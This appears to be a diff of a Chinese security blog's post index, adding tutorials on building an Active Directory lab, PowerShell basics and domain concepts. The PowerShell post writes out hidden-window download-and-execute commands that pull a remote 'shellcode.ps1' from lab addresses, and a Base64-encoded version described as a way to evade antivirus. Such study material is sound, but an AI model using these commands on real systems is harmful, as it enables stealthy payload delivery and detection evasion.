+    <content><![CDATA[<h1 id="构建内网环境"><a href="#构建内网环境" class="headerlink" title="构建内网环境"></a>构建内网环境</h1><p>Windows Server 2012 R2 ：192.168.1.1（DC）</p>
+<p>Windows Server 2008 R2 ：192.168.1.2</p>
+<p>Windows 7：192.168.1.3</p>
+<p>（仅主机模式）</p>
+<a id="more"></a>
+
+<h3 id="一、Windows-Server-2012-R2服务器"><a href="#一、Windows-Server-2012-R2服务器" class="headerlink" title="一、Windows Server 2012 R2服务器"></a>一、Windows Server 2012 R2服务器</h3><ol>
+<li>设置服务器IP、子网掩码、DNS<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209162125164-1972460549.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/1649905184148.png" alt="img"></a><br>2.更改计算机名<br>修改计算机名后需要重新启动计算机才能生效，加入域后计算机全名会自动改变R-DC.hacke.testlab。<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209162335857-1481038694.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499051879609.png" alt="img"></a><br>3.安装域控和DNS服务<br>打开服务器管理器<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209162411377-230981309.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/1649905190652.png" alt="img"></a><br>单击“添加角色和功能”选项，进入“添加角色和功能向导”界面，“开始之前”保持默认，“安装类型”选择“基于角色或基于功能的安装”，“服务器选择”部分目前只有一台，保持默认，服务器角色选择“Active Directory域服务器”和“DNS服务器”<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209162443575-84724627.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499051934509.png" alt="img"></a><br>“功能”部分保持默认，“确认”部分勾选“如果需要，自动重启目标服务器”，点击“安装”。<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209162657019-1840579792.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499051966475.png" alt="img"></a><br>4.升级服务器<br>安装Active Directory域服务后，需要将此服务器提升为域控，单击“将此服务器提升为域控选项”（如果不慎点击关闭，可以在服务器管理器的黄色感叹号操作）<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209162739134-384218285.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/1649905198390.png" alt="img"></a><br>进入“Active Directory”域服务配置向导，在部署配置选择”添加新林“，输入根域名<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209162822934-959911441.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052015008.png" alt="img"></a><br>在域控制器选项默认选项，输入目录还原密码<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209162921075-142183100.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052033089.png" alt="img"></a><br>DNS选项出现告警，无需理会，保持默认<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209162955775-685965798.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052071969.png" alt="img"></a><br>在”NetBIOS域名“保持默认，”路径“保持默认，“查看选项”保持默认，先决条件检查，这里需要创建Administrator账号的密码（符合复杂度），才能安装。 修改密码后 net user administrator /passwordreq:yes<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209163022674-616397022.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052105517.png" alt="img"></a><br>安装成功后，服务器重启，使用HACKER\Administrator登录，在服务器管理器界面中就有ADDS、DNS。<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209163048683-588952558.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052128584.png" alt="img"></a><br>为Windows 2008 R2和Windows 7 用户创建域控制器用户。在”工具“下的Active Diretory用户和计算机下在user目录下创建。如图<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209163117196-594897799.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052144093.png" alt="img"></a><br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209163142959-511246540.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052209001.png" alt="img"></a></li>
+</ol>
+<h3 id="二、Windows-Server-2008-R2服务器"><a href="#二、Windows-Server-2008-R2服务器" class="headerlink" title="二、Windows Server 2008 R2服务器"></a>二、Windows Server 2008 R2服务器</h3><p>配置IP、子网掩码、DNS<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209163217135-231871720.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/1649905222787.png" alt="img"></a><br>加入域环境<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209163241134-802935842.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052256168.png" alt="img"></a><br>重启登录域。<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209163326673-1074386194.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052282397.png" alt="img"></a></p>
+<h3 id="三、Windows-7计算机"><a href="#三、Windows-7计算机" class="headerlink" title="三、Windows 7计算机"></a>三、Windows 7计算机</h3><p>同Windows Server 2008 R2 IP：192.168.1.3<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209163356890-463474636.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052329475.png" alt="img"></a><br>环境配置完成。<br><a href="https://img2020.cnblogs.com/blog/2670873/202112/2670873-20211209163413135-769717021.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220414/16499052352595.png" alt="img"></a></p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>windows powershell 基础</title>
+    <url>/2022/04/10/1.2%20windows%20powershell%20%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="windows-powershell-基础"><a href="#windows-powershell-基础" class="headerlink" title="windows powershell 基础"></a>windows powershell 基础</h1><h2 id="1-powershell-基础"><a href="#1-powershell-基础" class="headerlink" title="1.powershell 基础"></a>1.powershell 基础</h2><p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p>
+<p>PowerShell 有如下特点：</p>
+<ul>
+<li>Windows 7 以上的操作系统默认安装</li>
+<li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li>
+<li>可以从另一个系统中下载 PowerShell 脚本并执行</li>
+<li>目前很多工具都是基于 PowerShell 开发的</li>
+<li>很多安全软件检测不到 PowerShell 的活动</li>
+<li>cmd 通常会被阻止运行，但是 PowerShell 不会</li>
+<li>可以用来管理活动目录</li>
+</ul>
+<a id="more"></a>
+
+<p>Windows 操作系统对应的 PowerShell 版本信息：</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>操作系统</strong></th>
+<th align="center"><strong>PowerShell 版本</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">windows server 2008</td>
+<td align="center">1.0</td>
+</tr>
+<tr>
+<td align="center">windows server 2008 r2、windows 7</td>
+<td align="center">2.0</td>
+</tr>
+<tr>
+<td align="center">windows server 2012、windows 8</td>
+<td align="center">3.0</td>
+</tr>
+<tr>
+<td align="center">windows server 2012 r2、windows 8.1</td>
+<td align="center">4.0</td>
+</tr>
+<tr>
+<td align="center">windows 10</td>
+<td align="center">5.0</td>
+</tr>
+<tr>
+<td align="center">windows server 2016</td>
+<td align="center">5.1</td>
+</tr>
+</tbody></table>
+<p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p>
+<p><img src="https://image.3001.net/images/20220414/16499051675611.png" alt="image-20220310143310023"></p>
+<h2 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2.基本概念"></a>2.基本概念</h2><h3 id="2-1-ps1-文件"><a href="#2-1-ps1-文件" class="headerlink" title="2.1 .ps1 文件"></a>2.1 .ps1 文件</h3><p>ps1 是 PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p>
+<h3 id="2-2-执行策略"><a href="#2-2-执行策略" class="headerlink" title="2.2 执行策略"></a>2.2 执行策略</h3><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式Restricted。</p>
+<p>使用 Get-ExecutionPolicy命令查看当前执行策略。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\joker&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
+
+<p>执行策略有以下几种：</p>
+<p>Restricted：不能运行脚本</p>
+<p>RemoteSigned：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p>
+<p>AllSigned：仅当脚本由受信任的发布者签名才能运行。</p>
+<p>Unrestricted：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p>
+<p>使用Set-ExecutionPolicy <policy name>设置执行策略，该命令需要管理员权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; Set-ExecutionPolicy Unrestricted</span><br><span class="line"></span><br><span class="line">执行策略更改</span><br><span class="line">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class="line">[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): A</span><br><span class="line"></span><br><span class="line">PS C:\WINDOWS\system32&gt; Get-ExecutionPolicy</span><br><span class="line">Unrestricted</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-运行脚本"><a href="#2-3-运行脚本" class="headerlink" title="2.3 运行脚本"></a>2.3 运行脚本</h3><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行，具体如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\joker&gt; Get-Content .\hey.ps1</span><br><span class="line">echo &quot;hello joekr!&quot;</span><br><span class="line">PS C:\Users\joker&gt; .\hey.ps1</span><br><span class="line">hello joker!</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-管道"><a href="#2-4-管道" class="headerlink" title="2.4 管道"></a>2.4 管道</h3><p>PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p>
+<p>例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p>
+<p><img src="https://image.3001.net/images/20220414/16499051735375.png" alt="image-20220310154935965"></p>
+<p>筛选出以字符 “p” 开头的程序，并以 ID 值进行排序。</p>
+<p><img src="https://image.3001.net/images/20220414/1649905175334.png" alt="image-20220310155003035"></p>
+<h2 id="3-PowerShell-常用命令"><a href="#3-PowerShell-常用命令" class="headerlink" title="3.PowerShell 常用命令"></a>3.PowerShell 常用命令</h2><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p>
+<h3 id="3-1-文件操作类命令"><a href="#3-1-文件操作类命令" class="headerlink" title="3.1 文件操作类命令"></a>3.1 文件操作类命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新建目录 test：</span><br><span class="line">New-Item test -ItemType directory</span><br><span class="line">删除目录 test：</span><br><span class="line">Remove-Item test</span><br><span class="line">新建文件 test.txt：</span><br><span class="line">New-Item test.txt -ItemType file</span><br><span class="line">新建文件 test.txt，内容为 hello：</span><br><span class="line">New-Item test.txt -ItemType file -value &quot;hello&quot;</span><br><span class="line">删除文件 test.txt：</span><br><span class="line">Remove-Item test.txt</span><br><span class="line">查看文件 test.txt内容：</span><br><span class="line">Get-Content  test.txt</span><br><span class="line">设置文件 test.txt内容t：</span><br><span class="line">Set-Content  test.txt  -Value &quot;hello&quot;</span><br><span class="line">给文件 test.txt追加内容：</span><br><span class="line">Add-Content test.txt  -Value &quot;,word!&quot;</span><br><span class="line">清除文件 test.txt内容：</span><br><span class="line">Clear-Content test.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-1-绕过本地权限并执行"><a href="#3-2-1-绕过本地权限并执行" class="headerlink" title="3.2.1 绕过本地权限并执行"></a>3.2.1 绕过本地权限并执行</h3><p>默认情况下 PowerShell 的执行策略是受限模式 <code>Restricted</code>，要想运行PowerShell脚本程序，必须使用管理员权限将策略从 <code>Restricted</code> 改为 <code>Unrestricted</code>。</p>
+<p>先来看看默认受限模式下执行脚本的情况</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\joker\Desktop&gt; powerShell.exe Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br><span class="line"></span><br><span class="line">PS C:\Users\joker\Desktop&gt; cat .\test.ps1</span><br><span class="line">echo &quot;hey joker&quot;</span><br><span class="line">PS C:\Users\joker\Desktop&gt; .\test.ps1</span><br><span class="line">.\test.ps1 : 无法加载文件 C:\Users\joker\Desktop\test.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:&#x2F;go.mi</span><br><span class="line">crosoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 中的 about_Execution_Policies。</span><br><span class="line">所在位置 行:1 字符: 1</span><br><span class="line">+ .\test.ps1</span><br><span class="line">+ ~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : SecurityError: (:) []，PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : UnauthorizedAccess</span><br></pre></td></tr></table></figure>
+
+<p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\joker\Desktop&gt; powershell.exe -ExecutionPolicy bypass -file .\test.ps1</span><br><span class="line">hey joker</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-2-下载远程脚本绕过权限并隐藏执行"><a href="#3-2-2-下载远程脚本绕过权限并隐藏执行" class="headerlink" title="3.2.2 下载远程脚本绕过权限并隐藏执行"></a>3.2.2 下载远程脚本绕过权限并隐藏执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.44.132:8000&#x2F;t.ps1&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>或者简写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.44.132:8000&#x2F;t.ps1&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-3-利用-Base64对命令进行编码"><a href="#3-2-3-利用-Base64对命令进行编码" class="headerlink" title="3.2.3 利用 Base64对命令进行编码"></a>3.2.3 利用 Base64对命令进行编码</h3><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，工具下载地址：</p>
+<p><a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py" target="_blank" rel="noopener">https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py</a></p>
+<p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 raw.txt 文本中，之后执行 <code>python ps_encoder.py -s raw.txt</code> 即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\joker\Downloads&gt;cat raw.txt</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.0.1&#x2F;shellcode.ps1&#39;)</span><br><span class="line"></span><br><span class="line">C:\Users\joker\Downloads&gt;python ps_encoder.py -s raw.txt</span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQAvAHMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>使用 –Enc 指定 Base64 编码内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQAvAHMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网基础知识</title>
+    <url>/2022/04/10/1.1%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>将不同的计算机按功能或者部门进行分类，同一网络中的工作组可以随意加入退出，可以互相访问，没有集中管理的作用，所有计算机权限对等。</p>
+<a id="more"></a>
+
+<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><h3 id="域-1"><a href="#域-1" class="headerlink" title="域"></a>域</h3><p>一个有安全边界的计算机集合（升级版的工作组），不同域不可互访，想要访问域内的资源必须以合法的身份访问，并且有响应的权限。</p>
+<h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>类似于域的门禁，负责所有计算机用户的身份权限验证工作，域内的计算机如果想互相访问就需要经过域控制器的审核。</p>
+<h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>就是一个域。一般至少有两台服务器，一台为域控，另一台做为备份域控，一般活动目录的数据库是存在域控中的。一旦使用过程中其中一台挂掉了，可以使用另一台恢复。否侧域内的其他用户就不能登录域了。</p>
+<h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>由于管理的特殊需求，需要在网络中划分多个域，第一个域就是父域，之后划分出的域就是该域的子域。比如公司的一些保密部门需要一些特殊的策略，那么可以将这些部门单独作为一个子域来管理，并且这个子域可以自己管理自己的资源。</p>
+<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>是多个域建立信任关系的集合。一个域管理员只能管理本域，不能访问或者管理其他的域，如果两个域之间需要互相访问，则需要建立信任关系。</p>
+<p><img src="https://image.3001.net/images/20220414/16499051466543.png" alt="image-20220121141743939"></p>
+<h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>是多个域树建立信任关系的集合。比如A公司收购了B公司，只需要将两个域树互信，就可以管理和使用整个域森的资源，并且保留公司原来的特性。</p>
+<p><img src="https://image.3001.net/images/20220414/16499051496945.png" alt="image-20220121141759395"></p>
+<h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>DNS域名服务器（Domain Name Server）是用于实现域名和与之对应的IP地址转换的服务器，域中的计算机是使用DNS来定位域控、服务器和其他网络服务的，域的名字就是DNS域的名字。测试中一般都是通过寻找DNS服务器来确定域控制器的位置。（DNS和域控一般都放在一台服务器上）</p>
+<h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><p>活动目录（Active Directory）是域环境中提供目录服务的组件。</p>
+<p>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。<br>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p>
+<h3 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h3><p>在活动目录中（Active Directory），管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“逻辑结构”。</p>
+<p>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</p>
+<h2 id="活动目录的主要功能"><a href="#活动目录的主要功能" class="headerlink" title="活动目录的主要功能"></a>活动目录的主要功能</h2><ul>
+<li>帐号集中管理，所有帐号均存在服务器上,方便对帐号的重命令/重置密码。</li>
+<li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件,可以让用户自由选择安装软件。</li>
+<li>环境集中管理，利用AD可以统一客户端桌面,IE,TCP/IP等设置。</li>
+<li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li>
+<li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。</li>
+<li>活动目录为Microsoft统一管理的基础平台，其它isa,exchange,sms等服务都依赖于这个基础平台。</li>
+</ul>
+<h2 id="AD与DC的区别"><a href="#AD与DC的区别" class="headerlink" title="AD与DC的区别"></a>AD与DC的区别</h2><p>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</p>
+<p>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</p>
+<p>那么有了域环境的话，回答最初的问题：在域环境中，只需要在活动目录中创建一次Alan账户，那么就可以在任意200台电脑中的一台上登录Alan，如果要为Alan账户更改密码，只需要在活动目录中更改一次就可以了。</p>
+<h2 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h2><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p>
+<p><img src="https://image.3001.net/images/20220414/16499051534906.png" alt="image-20220121142401954"></p>
+<h2 id="DMZ区域"><a href="#DMZ区域" class="headerlink" title="DMZ区域"></a>DMZ区域</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。<br>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。<br>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。</p>
+<h3 id="DMZ的屏障功能"><a href="#DMZ的屏障功能" class="headerlink" title="DMZ的屏障功能"></a>DMZ的屏障功能</h3><ul>
+<li>内网可以访问外网：内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</li>
+<li>内网可以访问DMZ：此策略使内网用户可以使用或者管理DMZ中的服务器。</li>
+<li>外网不能访问内网：这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果要访问，就要通过VPN方式来进行。</li>
+<li>外网可以访问DMZ：DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</li>
+<li>DMZ不能访问内网：如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。　</li>
+<li>DMZ不能访问外网：此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</li>
+</ul>
+<h2 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h2><ul>
+<li>域控制器</li>
+<li>成员服务器</li>
+<li>客户机</li>
+<li>独立服务器</li>
+</ul>
+<p>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</p>
+<p>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。</p>
+<p>同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</p>
+<h2 id="域内权限解读"><a href="#域内权限解读" class="headerlink" title="域内权限解读"></a>域内权限解读</h2><h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>组（Group）是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限，管理员在日常工作中不必要去为单个用户帐号设置自己独特的访问权限，而是将用户帐号加入到相对应的安全组中。管理员通过给相对的安全组访问权限就可以了，这样所有加入到安全组的用户帐号都将有同样的权限。使用安全组而不是单个的用户帐号可以方便，简化网络的维护和管理工作。</p>
+<h3 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h3><p>域本地组，多域用户访问单域资源（访问同一个域）。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。</p>
+<h3 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h3><p>全局组，单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</p>
+<h3 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h3><p>通用组，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。</p>
+<p>可以简单这样记忆：</p>
+<ul>
+<li>域本地组：来自全林用于本域</li>
+<li>全局组：来自本域用于全林</li>
+<li>通用组：来自全林用于全林</li>
+</ul>
+<h2 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h2><ul>
+<li>A(account)，表示用户账号</li>
+<li>G(Global group)，表示全局组</li>
+<li>U(Universal group)，表示通用组</li>
+<li>DL(Domain local group)，表示域本地组</li>
+<li>P(Permission 许可)，表示资源权限。</li>
+</ul>
+<p>A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。按照AGDLP的原则对用户进行组织和管理起来更容易。<br>在AGDLP形成以后,当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。</p>
+<p><img src="https://image.3001.net/images/20220414/16499051577396.png" alt="image-20220121142608387"></p>
+<h2 id="本地域组的权限"><a href="#本地域组的权限" class="headerlink" title="本地域组的权限"></a>本地域组的权限</h2><h3 id="本地域组的权限-1"><a href="#本地域组的权限-1" class="headerlink" title="本地域组的权限"></a>本地域组的权限</h3><ul>
+<li>Administrators（管理员组）</li>
+<li>Remote Desktop Users(远程登录组)</li>
+<li>Print Operators（打印机操作员组）</li>
+<li>Account Operators（帐号操作员组）</li>
+<li>Server Operaters（服务器操作员组）</li>
+<li>Backup Operators（备份操作员组）</li>
+</ul>
+<h3 id="全局组、通用组的权限"><a href="#全局组、通用组的权限" class="headerlink" title="全局组、通用组的权限"></a>全局组、通用组的权限</h3><ul>
+<li>Domain Admins（域管理员组）</li>
+<li>Enterprise Admins（企业系统管理员组）</li>
+<li>Schema Admins（架构管理员组）</li>
+<li>Domain Users（域用户组）</li>
+</ul>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
       </tags>
   </entry>
   <entry>
     <title>如何利用DNSlog进行更高效率的无回显渗透</title>
-    <url>/2022/03/15/DNSlog/</url>
+    <url>/2022/03/20/DNSlog/</url>
